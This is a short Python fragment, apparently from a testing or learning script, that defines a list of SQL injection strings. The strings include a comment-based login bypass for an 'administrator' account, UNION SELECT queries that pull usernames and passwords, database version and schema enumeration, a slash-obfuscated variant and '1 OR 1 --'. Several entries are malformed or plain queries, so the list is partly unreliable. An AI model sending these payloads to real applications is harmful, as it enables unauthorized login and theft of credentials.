#  //www.youtube.com/67732189-e1d0-4f0b-b0ae-7822704f3891" 
...
SQL_INJECT_REQUESTS = [
    "SELECT * FROM users WHERE username = 'administrator'--' AND password = ''",  #0
    "UNION SELECT username, password FROM users--", #1
    "SELECT * FROM v$version", #2
    "SELECT * FROM information_schema.tables", #3
    "/SELECT/ * FROM/ users/ WHERE /username = 'administrator'--'/ AND/ password = ''/", #4
    "SELECT * FROM users WHERE username = '$administrator'--' AND password = ''",   #5
    "select password from users where username ='$admin'",  #6
    "SELECT * FROM users WHERE username = ''",  #7
    "UNION SELECT password FROM users ", #8
    "SELECT username, password FROM userlist ",#9 
    "1 OR 1 --", #10
] 
